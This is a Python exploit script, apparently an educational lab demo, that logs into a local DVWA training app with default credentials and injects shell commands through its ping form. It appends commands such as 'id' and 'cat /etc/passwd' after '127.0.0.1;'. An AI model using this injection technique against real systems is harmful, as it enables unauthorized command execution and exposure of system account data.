#!/usr/bin/env python3
"""
Command Injection Exploitation Script for DVWA
Author: Daniel Oyanogbezina
Purpose: Educational demonstration of command injection vulnerability
"""

import requests
from bs4 import BeautifulSoup
import sys

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore:
        CYAN = YELLOW = GREEN = RED = MAGENTA = WHITE = ""
    class Style:
        RESET_ALL = ""

TARGET_URL = "http://localhost/vulnerabilities/exec/"
LOGIN_URL = "http://localhost/login.php"
SECURITY_URL = "http://localhost/security.php"

def print_banner():
    banner = f"""
{Fore.CYAN}{'='*70}
    Command Injection Exploitation Tool - DVWA
    Educational Purpose Only
{'='*70}{Style.RESET_ALL}
    """
    print(banner)

def get_authenticated_session():
    """Login to DVWA"""
    print(f"{Fore.YELLOW}[*] Logging into DVWA...{Style.RESET_ALL}")
    session = requests.Session()
    
    try:
        response = session.get(LOGIN_URL)
        login_data = {
            'username': 'admin',
            'password': 'password',
            'Login': 'Login'
        }
        session.post(LOGIN_URL, data=login_data)
        session.get(f"{SECURITY_URL}?security=low&seclev_submit=Submit")
        print(f"{Fore.GREEN}[+] Logged in successfully{Style.RESET_ALL}")
        return session
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        return None

def execute_command(session, command):
    """Execute command injection payload"""
    print(f"\n{Fore.CYAN}[*] Executing: {command}{Style.RESET_ALL}")
    
    payload = f"127.0.0.1; {command}"
    data = {'ip': payload, 'Submit': 'Submit'}
    
    try:
        response = session.post(TARGET_URL, data=data)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Extract output from pre tag
        results = soup.find_all('pre')
        if results:
            for result in results:
                output = result.get_text().strip()
                if output and 'PING' not in output:
                    print(f"{Fore.GREEN}[+] Output:{Style.RESET_ALL}")
                    print(f"{Fore.WHITE}{output}{Style.RESET_ALL}")
                    return True
        return False
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        return False

def main():
    print_banner()
    
    session = get_authenticated_session()
    if not session:
        print(f"{Fore.RED}[!] Failed to authenticate{Style.RESET_ALL}")
        sys.exit(1)
    
    # Test commands
    commands = [
        "whoami",
        "pwd",
        "id",
        "uname -a",
        "ls -la",
        "cat /etc/passwd | head -5"
    ]
    
    print(f"\n{Fore.MAGENTA}{'='*70}")
    print(f"Testing Command Injection Payloads")
    print(f"{'='*70}{Style.RESET_ALL}")
    
    for cmd in commands:
        execute_command(session, cmd)
    
    print(f"\n{Fore.MAGENTA}{'='*70}")
    print(f"[!] Exploitation Complete")
    print(f"[!] Educational purposes only")
    print(f"{'='*70}{Style.RESET_ALL}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted{Style.RESET_ALL}")
        sys.exit(0)
